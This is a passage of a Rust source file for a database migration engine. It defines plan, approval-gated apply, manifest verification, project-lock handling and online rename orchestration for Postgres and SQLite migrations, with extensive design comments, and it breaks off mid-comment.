//! The public `MigrationEngine` API — `plan` (lint/preview) → `gate` (approval)
//! → [`executor::apply`](crate::apply::executor::apply) (guard + role) (design §3 / §1.6).
//!
//! This is the surface a caller (control plane / CLI / builder) drives. The
//! pieces beneath it — the [`SqlGuard`](crate::guard::SqlGuard), the Postgres
//! [`apply`](crate::apply::executor::apply) flow, the least-privilege
//! [`migrator` role](crate::apply::role) — are already built; the engine *composes*
//! them into the documented pipeline:
//!
//! 1. an **author** (see [`crate::plan::author`]) produces the [`Migration`]s;
//! 2. [`MigrationEngine::plan`] runs the guard over every migration **read-only**
//!    (no DB) and returns a [`MigrationPlan`] — the dry-run / preview (scenario
//!    45): which migrations are destructive, which require approval, and which
//!    are *denied* (un-appliable);
//! 3. [`MigrationEngine::apply`] is the **gate**: it refuses a plan with any
//!    denial, refuses a destructive plan without explicit [`Approval::Approved`],
//!    and otherwise delegates to [`executor::apply`](crate::apply::executor::apply).
//!
//! **Defense in depth — the gate is additional, not a replacement.**
//! [`executor::apply`](crate::apply::executor::apply) *re-runs* the guard over every
//! pending `up` and runs the DDL under the least-privilege `migrator` role
//! (lines 1 & 2 of §1). The engine gate is a third check layered in front: even
//! if a caller hand-built a plan, the executor still independently denies the
//! dangerous surface and confines execution. The engine never disables those.

#[cfg(feature = "native-pg")]
use compio_postgres::Client;

pub use crate::approval::Approval;
use crate::apply::backend::MigrationBackend;
use crate::conn::ExecutorConfig;
use crate::apply::executor::{
    self, ApplyError, ApplyOutcome, LockMode, RollbackError, RollbackOutcome, RollbackRequest,
};
use crate::guard::{GuardConfig, GuardError, GuardOutcome};
use crate::model::migration::Migration;
use crate::plan::manifest::{compute_manifest, verify_manifest, ManifestError, ManifestHash};
use crate::render::step::{PlanStep, RenameStep};

/// Sentinel touched-set entry meaning "this deploy touches a table I cannot
/// NAME" (§2.0.3). The lowering folds it in when a `dropIndex` omits its
/// owning-table hint AND the live schema cannot resolve the index's owner
/// (`IrAuthor::resolve_index_owner` returned `None`). The engine's
/// pending-contract read-back treats its presence as a fail-closed signal: a
/// deploy carrying it is REFUSED if ANY obligation is outstanding (the engine
/// owns the obligation set, so the "refuse-if-any-outstanding" decision is made
/// here, not at lower-time). It contains a NUL byte so it can never equal a real
/// (parseable) table identifier.
pub const TOUCHES_UNKNOWN: &str = "\0__zeroship_touches_unknown__";

/// One linted migration in a [`MigrationPlan`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedMigration {
    /// The migration itself (clone of the input).
    pub migration: Migration,
    /// Its passing **neutral** guard outcome — the destructive flag + operational
    /// [`Advisory`](crate::analyze::Advisory)s the engine consumes. The
    /// PG-specific statement `classes` stay inside the PG guard
    /// ([`SqlGuard`](crate::guard::SqlGuard)/[`GuardReport`](crate::guard::GuardReport))
    /// and are not surfaced here — the engine seam is dialect-neutral (P0 H2).
    pub report: GuardOutcome,
}

/// The read-only result of [`MigrationEngine::plan`] — the dry-run / preview
/// (design scenario 45).
///
/// A plan is **un-appliable** if [`denied`](Self::denied) is non-empty: the
/// guard hard-denied at least one migration's `up` (RCE / cross-tenant / file /
/// network), so [`MigrationEngine::apply`] refuses it outright.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MigrationPlan {
    /// The migrations that passed the guard, with their reports, in input order.
    pub items: Vec<PlannedMigration>,
    /// `true` if any planned item is destructive (data loss) — either the guard's
    /// SQL-text classification or the migration's own `flags.destructive`.
    pub destructive: bool,
    /// `true` if applying this plan requires explicit approval. Usually tracks
    /// `destructive`, but an author may stamp `flags.requires_approval` on an op
    /// the guard reads as non-destructive (e.g. a UNIQUE-index DROP, #4) so it is
    /// gated independently of the SQL-text data-loss judgement.
    pub requires_approval: bool,
    /// Migrations the guard **denied**, as `(version, error)`. A non-empty list
    /// makes the whole plan un-appliable — `apply` returns
    /// [`EngineError::Denied`] and runs nothing.
    pub denied: Vec<(String, GuardError)>,
}

impl MigrationPlan {
    /// `true` if the plan can be applied (no denials).
    #[must_use]
    pub const fn is_appliable(&self) -> bool {
        self.denied.is_empty()
    }
}

/// A failure from [`MigrationEngine::apply`].
#[derive(Debug, thiserror::Error)]
pub enum EngineError {
    /// The plan contains guard denials and can never be applied. Carries the
    /// denied `(version, error)` pairs for reporting. Nothing was applied.
    #[error("plan is un-appliable: {} migration(s) denied by the guard", .0.len())]
    Denied(Vec<(String, GuardError)>),
    /// The plan is destructive (or otherwise requires approval) but
    /// [`Approval::Approved`] was not given. Nothing was applied.
    #[error("plan requires approval (destructive) but none was given")]
    ApprovalRequired,
    /// **PR9b per-version approval scoping (anti-bypass).** The plan is approved
    /// ([`Approval::Approved`]) but it carries a DESTRUCTIVE op whose version-id is
    /// NOT in the operator's reviewed [`ApprovalScope::Versions`] set — so approving
    /// one reviewed op (e.g. an online rename) did NOT authorize this unrelated
    /// destructive op (a `dropColumn`/`dropTable`). Fail-closed: nothing was
    /// applied. Carries the refused version so the operator message + the test
    /// assertion can name the exact op that needs individual review.
    ///
    /// [`ApprovalScope`]: crate::ApprovalScope
    /// [`ApprovalScope::Versions`]: crate::ApprovalScope::Versions
    #[error(
        "destructive migration '{version}' is not in the approved version scope \
         (approving one reviewed op does not authorize a co-bundled destructive op; \
         review and approve '{version}' individually)"
    )]
    ApprovalNotScoped {
        /// The destructive migration version-id the scope refused.
        version: String,
    },
    /// The executor failed (DB error, checksum drift, mid-apply failure, or the
    /// executor's own re-run of the guard denied a migration — defense in depth).
    #[error(transparent)]
    Apply(#[from] ApplyError),
    /// The supplied migration set did not match the expected integrity manifest
    /// (v3 Plan F) — the bundle was reordered / edited / inserted-into / removed-
    /// from relative to the trusted [`ManifestHash`] stamped at build/review time.
    /// Refused by [`MigrationEngine::apply_verified`] **before** the advisory lock
    /// or any DDL: NOTHING was applied. Carries the
    /// [`ManifestError`](crate::plan::manifest::ManifestError) diagnostic.
    #[error(transparent)]
    Manifest(#[from] ManifestError),
    /// **Fail-closed cross-deploy pending-contract refusal (§2.0.3 item 2).** The
    /// deploy's op list touches a table with an OUTSTANDING online-rename contract
    /// from a prior deploy. The read-back runs inside the held project lock (so it
    /// is not a TOCTOU, §2.0.3 item 4); the deploy applies NOTHING. Carries the
    /// structured [`PendingContractRefusal`](crate::plan::pending::PendingContractRefusal)
    /// (§8.8) whose `apply_action` names the exact `migrate resolve-pending --apply`
    /// remedy. The human message is the projection of the payload.
    #[error("{0}")]
    PendingContract(crate::plan::pending::PendingContractRefusal),
    /// **Fail-closed cross-plan `depends_on` block (§2.0.4).** A step (or the
    /// plan) declares `depends_on: [A]` where A is an online rename whose contract
    /// is still OUTSTANDING from a prior deploy — so A is NOT fully satisfied and
    /// the dependent plan B MUST NOT apply against a half-applied A, **even when B
    /// touches a DIFFERENT table** (the case the §2.0.3 touched-table refusal does
    /// not cover — the §2.0.4 "double-bind"). The read-back runs inside the held
    /// project lock (so it is not a TOCTOU, §2.0.3 item 4); the deploy applies
    /// NOTHING. Carries the structured
    /// [`DependencyPendingContract`](crate::plan::pending::DependencyPendingContract)
    /// (§8.8) whose `remediation` is `apply_dependency_contract`. Roll-forward (not
    /// deadlock): applying A's contract unblocks B.
    #[error("{0}")]
    DependencyPendingContract(crate::plan::pending::DependencyPendingContract),
}

/// A failure from [`MigrationEngine::rollback`].
#[derive(Debug, thiserror::Error)]
pub enum RollbackEngineError {
    /// Rollback is destructive (a `down` typically drops/reverses schema) and
    /// requires explicit [`Approval::Approved`], which was not given. Nothing was
    /// rolled back.
    #[error("rollback requires approval (a down is destructive) but none was given")]
    ApprovalRequired,
    /// The executor's rollback failed (guard denial on a `down`, irreversible
    /// without force, checksum drift, mid-rollback DB error, …).
    #[error(transparent)]
    Rollback(#[from] RollbackError),
}

/// The public migration engine (design §3 `MigrationEngine` seam).
#[derive(Debug, Clone, Default)]
pub struct MigrationEngine;

impl MigrationEngine {
    /// Construct the engine. (Stateless; the executor + guard config are passed
    /// per call so one engine serves every project.)
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Lint + preview a migration set **read-only** (no DB) — the dry-run /
    /// plan phase (design scenario 45).
    ///
    /// Runs the [`crate::guard::SqlGuard`] over every migration's `up`. A guard **denial** is
    /// recorded in [`MigrationPlan::denied`] (and the migration is *not* added to
    /// `items`), so a caller sees **every** problem in the set at once rather
    /// than aborting on the first. `destructive` / `requires_approval` are `true`
    /// if any passing item's report flags data loss.
    #[must_use]
    pub fn plan(&self, migrations: &[Migration], cfg: &GuardConfig) -> MigrationPlan {
        // Multi-engine P0 (design 2026-06-21 §2.2 L3) — run the **per-engine**
        // line-1 guard for `cfg`'s dialect through the [`MigrationGuard`] seam, NOT
        // an `if dialect == Sqlite` branch. Postgres → [`PgGuard`] (libpg_query
        // deny-list); SQLite → [`SqliteDescriptorGuard`] (the trusted
        // descriptor-diff path: `libpg_query` cannot vet SQLite, so its `check`
        // returns the empty clean outcome — the line-1 vet is the descriptor emitter
        // at the author boundary, the line-2 defense the `SqliteBackend` authorizer
        // at apply). The destructive / approval combination with the migration's OWN
        // author flags stays here (engine logic), identical for both dialects.
        let guard = crate::guard::guard_for(cfg);
        let mut items = Vec::new();
        let mut denied = Vec::new();
        let mut destructive = false;
        let mut requires_approval = false;
        for m in migrations {
            match guard.check(&m.up) {
                Ok(report) => {
                    // A plan is destructive / approval-gated if EITHER the guard's
                    // SQL-text classification flags data loss OR the author stamped
                    // the migration's own flags. The author flag matters for ops
                    // the guard cannot judge from SQL text alone: a `DROP INDEX` of
                    // a UNIQUE index reads as a plain (reversible) index drop to the
                    // guard, but it silently removes a data-integrity guarantee, so
                    // the declarative author marks it `destructive + requires_approval`
                    // (#4) — and the executor's own gate already honours that flag,
                    // so the plan summary must agree (otherwise the engine would
                    // report a non-gated plan that the executor then refuses).
                    destructive |= report.destructive || m.flags.destructive;
                    requires_approval |= report.destructive || m.flags.requires_approval;
                    items.push(PlannedMigration {
                        migration: m.clone(),
                        report,
                    });
                }
                Err(e) => denied.push((m.version.as_str().to_string(), e)),
            }
        }
        MigrationPlan {
            items,
            destructive,
            requires_approval,
            denied,
        }
    }

    /// Diff a **desired** declarative schema against the **live** snapshot and
    /// lint the generated migrations into a [`MigrationPlan`] (v3 Plan A).
    ///
    /// This is the declarative entry point: it runs
    /// [`DeclarativeAuthor::diff`](crate::render::declarative::DeclarativeAuthor::diff)
    /// (additive ops + destructive-gated drops, with author-boundary name/type
    /// validation) and then feeds the result through the EXISTING [`plan`](Self::plan) —
    /// so the generated SQL gets the same guard treatment as any other author's
    /// output (no bypass). A destructive drop in the diff makes the plan
    /// `requires_approval`, exactly as a hand-authored drop would.
    ///
    /// `hints` are the OPT-IN [`RenameHint`](crate::render::declarative::RenameHint)s
    /// (P3): each routes a hinted drop+add pair through the zero-downtime
    /// expand-contract rename sequence instead of an independent drop + add.
    /// Without a matching hint a drop+add stays two independent ops — the differ
    /// NEVER infers a rename heuristically. An empty slice ⇒ pure P0–P2 behaviour.
    ///
    /// # A declarative rename is an online, multi-deploy op (C1)
    ///
    /// A hinted rename is NOT folded into the linted plain plan: a rename's
    /// [`ExpandContractPlan`](crate::render::expand_contract::ExpandContractPlan) carries a
    /// [`BackfillSpec`](crate::model::backfill::BackfillSpec) that must run the REAL
    /// pre-existing-row mirror (see [`run_expand`](Self::run_expand)). Flattening
    /// it through the plain `plan` → `apply` path would discard the backfill and
    /// the contract `DROP COLUMN <from>` would then destroy un-mirrored rows. So
    /// the result keeps the plain migrations and the renames SEPARATE; drive the
    /// whole thing through [`apply_declarative`](Self::apply_declarative).
    ///
    /// # Caller contract
    ///
    /// `desired` MUST be the **COMPLETE project union** (every member app's
    /// descriptors), and `live_ownership` MUST carry an entry (`live table name →
    /// owning app`) for **every live table**, supplied from the journal / route
    /// registry. These are the differ's fail-closed guard against a PARTIAL-union
    /// deploy mass-dropping other tenants' tables (2b): a `DROP TABLE` is authored
    /// only when `live_ownership` confirms the deploying app owns that table; an
    /// other-owned or ownership-unknown live table being dropped fails closed
    /// (refused) rather than authoring a destructive foreign drop. See
    /// [`DeclarativeAuthor::diff`](crate::render::declarative::DeclarativeAuthor::diff).
    ///
    /// # Errors
    /// [`DeclarativeError`](crate::render::declarative::DeclarativeError) if the diff
    /// hits an unsupported op, an unmatched/type-mismatched rename hint, an
    /// invalid descriptor name/type at the author boundary, or a refused drop
    /// (`NotTableOwner` / `DropOfUnownedTable` — fail-closed drop ownership). A
    /// guard *denial* on generated SQL is NOT an error here — it lands in
    /// [`MigrationPlan::denied`] like any other.
    pub fn plan_declarative(
        &self,
        desired: &crate::render::declarative::DesiredSchema,
        live: &crate::model::snapshot::SchemaSnapshot,
        live_ownership: &std::collections::HashMap<String, String>,
        author: &crate::render::declarative::DeclarativeAuthor,
        hints: &[crate::render::declarative::RenameHint],
        cfg: &GuardConfig,
    ) -> Result<DeclarativeDeployPlan, crate::render::declarative::DeclarativeError> {
        let diff = author.diff(desired, live, live_ownership, hints)?;
        // P6a — CARRY `diff.rebuilds` into the plan (the fail-close is gone). The
        // SQLite 12-step table rebuilds are no longer dropped/refused: the generic
        // [`apply_declarative`](Self::apply_declarative) drives each through
        // [`MigrationBackend::rebuild_one`](crate::apply::backend::MigrationBackend::rebuild_one)
        // within the same locked/journaled apply, under the destructive/approval gate
        // (a rebuild's journal migration carries `destructive + requires_approval`).
        // `diff.rebuilds` is ALWAYS empty on the PG path (PG uses native `ALTER` /
        // expand-contract), so the PG `DeclarativeDeployPlan` is byte-identical to
        // before; only the SQLite leg gains a non-empty `rebuilds`.
        let plain = self.plan(&diff.migrations, cfg);
        Ok(DeclarativeDeployPlan {
            plain,
            renames: diff.renames,
            rebuilds: diff.rebuilds,
        })
    }

    /// Apply a declarative deploy plan as the **online, multi-deploy** operation
    /// it is (C1 — never flatten a rename).
    ///
    /// In one call (deploy N) it:
    /// 1. applies the **plain** migrations through the existing gated
    ///    [`apply`](Self::apply) (denial / approval gate + the executor's own
    ///    guard + least-privilege role); then
    /// 2. for each rename, drives the **expand** through
    ///    [`run_expand`](Self::run_expand) — which applies E1 (ADD COLUMN) + E2
    ///    (dual-write trigger), runs the REAL [`run_backfill`](crate::apply::backend::postgres::backfill::run_backfill) mirroring every
    ///    pre-existing `<from>` value into `<to>`, and journals E3 **only after**
    ///    the backfill succeeds (Plan-8 data-integrity ordering); and
    /// 3. collects every rename's **contract** (DROP TRIGGER C1 + DROP COLUMN
    ///    `<from>` C2) into [`DeclarativeDeployOutcome::pending_contract`] —
    ///    the DEFERRED set to apply in a SUBSEQUENT deploy, AFTER the app's code
    ///    has switched from `<from>` to `<to>`.
    ///
    /// The contract is deliberately NOT applied here: the executor's
    /// expand/contract gate refuses a contract while its own expand is still
    /// pending in the same batch, and — more importantly — dropping `<from>`
    /// before old code stops reading it breaks the rolling fleet. Surfacing the
    /// contract as `pending_contract` makes the multi-deploy partition explicit.
    ///
    /// # Deploy sequence
    /// ```text
    /// deploy N    : apply_declarative(plan)  →  plain + EXPAND (backfill runs);
    ///               returns pending_contract.  Code still uses <from>; <to> is
    ///               populated + dual-written.
    /// (code switch): a later app deploy reads/writes <to> only.
    /// deploy N+1  : engine.apply(plan_of(pending_contract), Approved, …)  →
    ///               DROP TRIGGER + DROP COLUMN <from>.  Zero data loss: every
    ///               row's value already lives in <to>.
    /// ```
    ///
    /// `approval` must be [`Approval::Approved`] when the plain plan is gated OR
    /// any rename is present (the expand's backfill mutates data). The
    /// `pending_contract` set is itself gated (`requires_approval`, and C2 is
    /// `destructive`), so applying it later also needs approval.
    ///
    /// # Errors
    /// - [`DeclarativeApplyError::Plain`] — the gated plain `apply` failed
    ///   (denial, missing approval, or an executor failure). No expand ran.
    /// - [`DeclarativeApplyError::Expand`] — a rename's expand/backfill failed.
    ///   The plain migrations + any earlier renames are already applied; the
    ///   backfill is resumable on a re-run.
    pub async fn apply_declarative<B: MigrationBackend>(
        &self,
        plan: &DeclarativeDeployPlan,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // H10 — hold the project advisory lock for the WHOLE declarative deploy.
        //
        // A declarative deploy is several sub-batches: the plain set plus one
        // expand per rename, each of which (left to itself) would acquire AND
        // RELEASE the project advisory lock. Releasing between sub-batches frees
        // the lock, letting a concurrent deploy for the SAME project interleave
        // its own sub-batch — so a multi-rename deploy would NOT be serialized as
        // a whole, violating design §2.3 ("serialize ALL migration activity").
        //
        // Fix: acquire the lock ONCE here, drive every inner sub-batch with
        // `LockMode::AlreadyHeld` (skip their acquire/release), and release ONCE
        // on EVERY exit path below (success/error/early-return) — mirroring
        // `executor::apply`'s release-on-every-path discipline. The lock is taken
        // exactly once and freed exactly once per declarative deploy; it is never
        // free between sub-batches.
        //
        // We acquire the lock BEFORE the gate's denial/approval check is performed
        // inside `apply_inner`; that check still runs (with `AlreadyHeld`) and can
        // return early — every such early return runs through `release_or_warn`
        // below, so the lock is never held forever on a gate rejection.
        //
        // P6a — the lock is acquired/released through the dialect seam
        // (`backend.acquire/release_project_lock`) rather than the PG `*_outer`
        // free-fns. For the PG backend this is byte-identical (`PostgresBackend`
        // delegates straight to `executor::pg::acquire/release_project_lock`, i.e. the
        // same `pg_advisory_lock(hashtext(project))`); for SQLite the lock is a no-op
        // (single-actor serialization is the lock). The single-acquire / single-release
        // H10 discipline is unchanged.
        backend
            .acquire_project_lock(exec_cfg)
            .await
            .map_err(EngineError::from)?;

        let result = self
            .apply_declarative_locked(plan, approval, backend, exec_cfg, applied_by)
            .await;

        // Release on EVERY path. Surface the deploy error first; a release failure
        // is logged (the lock auto-releases on session end regardless).
        if let Err(e) = backend.release_project_lock(exec_cfg).await {
            tracing::warn!(
                error = %e,
                project = %exec_cfg.project_id,
                "zeroship-migrate: failed to release project lock after apply_declarative (H10)"
            );
        }

        result
    }

    /// Apply a declarative deploy plan, **verifying its set-level integrity
    /// manifest first** (v3 Plan F — the declarative peer of
    /// [`apply_verified`](Self::apply_verified), closing the H1 coverage gap).
    ///
    /// This is the trusted-deploy entry point for the DECLARATIVE (AI-driven)
    /// path. Before ANY apply work — before the denial/approval gate, before the
    /// H10 outer project advisory lock, before a single statement of DDL —
    /// it recomputes the integrity manifest over the plan's **full effective
    /// migration set** ([`DeclarativeDeployPlan::manifest`]) and compares it to
    /// `expected`. A mismatch (the generated plan was reordered / content-edited /
    /// inserted-into / removed-from between the control plane STAMPING it and this
    /// APPLY) returns [`EngineError::Manifest`] — surfaced as
    /// [`DeclarativeApplyError::Plain`] — and applies NOTHING: no lock taken, no
    /// journal touched, no DDL run. A match falls through to the normal
    /// [`apply_declarative`](Self::apply_declarative) orchestration.
    ///
    /// # The effective set is what the executor actually runs
    ///
    /// A declarative deploy is the plain migrations PLUS, per rename, that
    /// rename's expand AND its (deferred) contract migrations. The manifest is
    /// computed over EXACTLY that set (see [`DeclarativeDeployPlan::manifest`]),
    /// folded in the canonical executed order [`compute_manifest`] already
    /// applies. So a tamper of a plain migration, a rename's expand, OR the
    /// deferred contract is all caught at deploy N's verify — even though the
    /// contract is only APPLIED in a later deploy N+1. The stamp must cover the
    /// whole generated plan, including the deferred drop.
    ///
    /// # Determinism caveat — stamp + apply ONE generated plan instance
    ///
    /// Declarative migration versions are freshly minted per
    /// [`plan_declarative`](Self::plan_declarative) call (`UUIDv7`), so a given
    /// manifest is only stable for a SPECIFIC generated [`DeclarativeDeployPlan`]
    /// instance. The control plane MUST generate the plan ONCE, compute the stamp
    /// with [`DeclarativeDeployPlan::manifest`] over THAT instance, hold the plan
    /// out-of-band, and apply THAT SAME plan here — it must NOT re-generate
    /// between stamp and apply (a fresh `plan_declarative` would mint new versions
    /// and never match). The stamp side and this verify side call the SAME
    /// `manifest()` implementation, so they cannot diverge.
    ///
    /// # Trust model — caller contract
    ///
    /// `expected` MUST come from a TRUSTED source (the control plane, stamping at
    /// build / review time and holding it out-of-band), NOT from the same bundle
    /// the plan arrived in — see [`crate::plan::manifest`]'s trust model and
    /// [`apply_verified`](Self::apply_verified).
    ///
    /// # Errors
    /// - [`DeclarativeApplyError::Plain`] wrapping [`EngineError::Manifest`] — the
    ///   effective set did not match `expected`. Refused before the gate / lock /
    ///   DDL; nothing applied.
    /// - [`DeclarativeApplyError::Plain`] / [`DeclarativeApplyError::Expand`] — the
    ///   same gate + executor + expand errors as
    ///   [`apply_declarative`](Self::apply_declarative), after a successful
    ///   manifest check.
    pub async fn apply_declarative_verified<B: MigrationBackend>(
        &self,
        plan: &DeclarativeDeployPlan,
        expected: &ManifestHash,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // Pre-apply manifest gate over the plan's FULL EFFECTIVE set (plain +
        // every rename's expand + contract + every rebuild's journal migration),
        // folded in canonical executed order by the SAME implementation the control
        // plane stamped with. This runs BEFORE `apply_declarative` (and therefore
        // before the H10 outer advisory lock and any DDL): a tampered plan is rejected
        // without contending for the lock or opening a transaction, leaving the
        // database + journal untouched.
        verify_manifest(&plan.effective_set(), expected).map_err(EngineError::from)?;
        // Verified ⇒ the normal gated, lock-wrapped declarative orchestration.
        self.apply_declarative(plan, approval, backend, exec_cfg, applied_by)
            .await
    }

    /// The body of [`apply_declarative`](Self::apply_declarative), run while the
    /// outer project advisory lock is held (H10).
    ///
    /// **PR0 — re-pointed onto the single shared [`apply_plan`](Self::apply_plan)
    /// via the thin shape-adapter (§6.0).** This function no longer *contains* the
    /// interleave/journal/`pending_contract` orchestration; it is now a
    /// shape-adapter that lowers the declarative [`DeclarativeDeployPlan`] into the
    /// neutral ordered [`PlanStep`] list — its `plain.items` → [`PlanStep::Ddl`],
    /// its `rebuilds` → [`PlanStep::OnlineRename`]`(`[`RenameStep::SqliteRebuild`]`)`,
    /// its `renames` → [`PlanStep::OnlineRename`]`(`[`RenameStep::PgExpandContract`]`)`,
    /// preserving the historical order plain → rebuilds → renames — then feeds it
    /// to [`apply_plan`](Self::apply_plan). After PR0 there is exactly ONE
    /// orchestrator; the declarative path is a *producer* of `Vec<PlanStep>`.
    ///
    /// The plain set's denial / approval **gate** (the
    /// [`apply_inner`](Self::apply_inner) gate) still runs here, before lowering —
    /// a denied or un-approved-destructive plain set is refused exactly as before,
    /// untouched by the convergence.
    async fn apply_declarative_locked<B: MigrationBackend>(
        &self,
        plan: &DeclarativeDeployPlan,
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // Preserve the plain-set gate exactly as `apply_inner` runs it: a denied
        // plain plan can never apply; a destructive plain plan needs approval.
        // (The executor re-runs its own destructive gate as defense in depth.)
        if !plan.plain.denied.is_empty() {
            return Err(DeclarativeApplyError::Plain(EngineError::Denied(
                plan.plain.denied.clone(),
            )));
        }
        if plan.plain.requires_approval && approval != Approval::Approved {
            return Err(DeclarativeApplyError::Plain(EngineError::ApprovalRequired));
        }

        // Shape-adapter (§6.0): declarative plan → the neutral ordered PlanStep
        // list, in the historical execution order (plain DDL spine, then each
        // SQLite rebuild, then each PG online rename's EXPAND). Empty `rebuilds`
        // on PG and empty `renames` on SQLite, so each dialect produces exactly
        // the steps its old code path drove.
        let mut steps: Vec<PlanStep> = Vec::new();
        for p in &plan.plain.items {
            steps.push(PlanStep::Ddl(p.migration.clone()));
        }
        for rebuild in &plan.rebuilds {
            steps.push(PlanStep::OnlineRename(RenameStep::SqliteRebuild(
                rebuild.clone(),
            )));
        }
        for rename in &plan.renames {
            steps.push(PlanStep::OnlineRename(RenameStep::PgExpandContract(
                rename.clone(),
            )));
        }

        // **Empty-plain-set session hygiene — intentional, state-neutral
        // simplification (code-critic LOW #4).** Pre-PR0,
        // `apply_declarative_locked` ALWAYS called `apply_inner(&plan.plain, …)` →
        // `apply_with_lock_backend` first, which ran one
        // `snapshot_session`/`reset_role_best_effort`/`restore_session` hygiene cycle
        // up front — even for an empty `plain.items`. Post-PR0 the coalesce loop only
        // calls `apply_with_lock_backend` when there is at least one `Ddl` step, so a
        // rebuild-only or rename-only declarative deploy (empty plain set) skips that
        // *initial* hygiene cycle. This is a deliberate simplification, NOT a leak:
        // every step kind that can run with an empty plain set manages its OWN session
        // hygiene — a PG online rename's `run_online` snapshots+restores the session
        // around its dual-write trigger / `SET ROLE` DDL, and a SQLite `rebuild_one`
        // owns its single actor — so the connection is left with the admin role and an
        // un-pinned `search_path` regardless. The redundant empty up-front cycle bought
        // nothing but an extra round-trip; dropping it is state-neutral. The invariant
        // (a rename-only / rebuild-only deploy leaves the session role + search_path
        // clean) is asserted by `declarative_pg::
        // rename_only_deploy_leaves_session_role_and_search_path_clean`.

        // The single shared orchestrator. The outer project lock is already held
        // (H10), so every inner sub-batch re-enters it with `LockMode::AlreadyHeld`.
        self.apply_plan(&steps, approval, backend, exec_cfg, applied_by, LockMode::AlreadyHeld)
            .await
    }

    /// **The single shared plan orchestrator (`op.*` DSL §2.0 / §6 / §6.0, PR0).**
    ///
    /// Runs an ordered [`PlanStep`] list — the convergence point of the declarative
    /// path (re-pointed here via the shape-adapter in
    /// [`apply_declarative_locked`](Self::apply_declarative_locked)) and the future
    /// IR `op.*` path. It is plan-shape-neutral: it dispatches by step kind,
    /// reusing the existing downstream primitives unchanged as execution
    /// destinations —
    /// [`apply_with_lock_backend`](crate::apply::executor::apply_with_lock_backend) for
    /// DDL, [`run_online`](crate::apply::backend::OnlineSchemaChange::run_online)
    /// for a PG online rename (with the `pending_contract` partition),
    /// [`rebuild_one`](crate::apply::backend::MigrationBackend::rebuild_one) for a SQLite
    /// rebuild rename, and the data-step seams
    /// ([`run_backfill_step`](crate::apply::backend::MigrationBackend::run_backfill_step) /
    /// [`run_dml_step`](crate::apply::backend::MigrationBackend::run_dml_step)).
    ///
    /// # Lock discipline
    /// `lock_mode` is threaded into every sub-batch. The declarative caller holds
    /// the project lock for the whole deploy and passes
    /// [`LockMode::AlreadyHeld`]; a standalone caller passes
    /// [`LockMode::Acquire`] for the first DDL batch and `AlreadyHeld` thereafter
    /// (the orchestrator does this coalescing internally so the whole plan runs
    /// under one lock acquisition).
    ///
    /// # Coalescing
    /// Consecutive [`PlanStep::Ddl`] steps are coalesced into ONE
    /// `apply_with_lock_backend` batch, so the declarative plain set (a contiguous
    /// run of `Ddl` steps) is applied as a single batch — byte-identical session
    /// hygiene + journaling to the pre-PR0 path.
    ///
    /// # `OnlineRename` dual-execution dispatch (§2.6.2)
    /// A [`RenameStep::PgExpandContract`] runs E1+E2→backfill→E3 atomically under
    /// the held lock via `run_online` and surfaces C1/C2 as `pending_contract`
    /// (the cross-deploy partition, §2.0.2). A [`RenameStep::SqliteRebuild`] is one
    /// atomic offline `rebuild_one` (approval-gated + net-applied-skipped); it has
    /// NO `pending_contract`.
    ///
    /// # Errors
    /// [`DeclarativeApplyError`] — `Plain` for a gate / DDL / DML / backfill /
    /// rebuild failure, `Expand` for an online-rename expand/backfill failure.
    pub async fn apply_plan<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // The DDL/DML touched-set is derived from the structured plan steps
        // (`OnlineRename` carries its intent table; `Ddl`/`Dml` carry no structured
        // table, so a bare `.sql`/declarative-shaped plan contributes only what the
        // steps expose). The IR production path, which is the ONLY producer of a
        // pending contract, threads its op-list touched-set via
        // [`apply_plan_with_touched`](Self::apply_plan_with_touched). The plain
        // entry point uses the step-derived set, which is sufficient for the
        // refusal of a second renameColumn on the pending table (its EXPAND step
        // names the table) and never under-fires for the SQLite leg (always empty
        // outstanding set). See §2.0.3 item 2.
        let touched: Vec<String> = crate::render::step::tables_touched_by(steps).into_iter().collect();
        self.apply_plan_with_touched(
            steps, &touched, approval, backend, exec_cfg, applied_by, lock_mode,
        )
        .await
    }

    /// As [`apply_plan`](Self::apply_plan), but with the caller-supplied
    /// **touched-table set** for the §2.0.3 cross-deploy pending-contract
    /// interlock. The IR deploy path passes its op-list touched-set
    /// ([`LoweredArtifact::touched_tables`](crate::render::lower::LoweredArtifact)) so
    /// the refusal catches ANY op (DDL or DML) touching a table with an
    /// outstanding pending contract — not just the structurally-typed
    /// `OnlineRename` steps. The step-derived set (the `OnlineRename` intent
    /// tables) is UNIONed in regardless, so a caller that passes an empty slice
    /// still gets rename-step coverage.
    ///
    /// # Errors
    /// Same as [`apply_plan`](Self::apply_plan), plus
    /// [`EngineError::PendingContract`] (wrapped in [`DeclarativeApplyError::Plain`])
    /// when the touched-set intersects an outstanding pending contract.
    #[allow(clippy::too_many_arguments)]
    pub async fn apply_plan_with_touched<B: MigrationBackend>(
        &self,
        steps: &[PlanStep],
        touched_tables: &[String],
        approval: Approval,
        backend: &B,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
        lock_mode: LockMode,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        self.apply_plan_resolving(
            steps,
            touched_tables,
            &[],
            &[],
            approval,
            &crate::approval::ApprovalScope::All,
            backend,
            exec_cfg,
            applied_by,
            lock_mode,
            // Routine (non-deploy) caller — no recovery scope (PR9e R2).
            None,
        )
        .await
    }

    /// As [`apply_plan_with_touched`](Self::apply_plan_with_touched), but ALSO
    /// threads the artifact's plan-level **`depends_on`** versions so the §2.0.4
    /// cross-plan dependency block fires at APPLY (not only in `status`). The IR
    /// deploy path passes its `.ir.json` `depends_on` here: if any referenced
    /// dependency is an online rename whose contract is still OUTSTANDING, the
    /// deploy is fail-closed refused with `DEPENDENCY_PENDING_CONTRACT` — even when
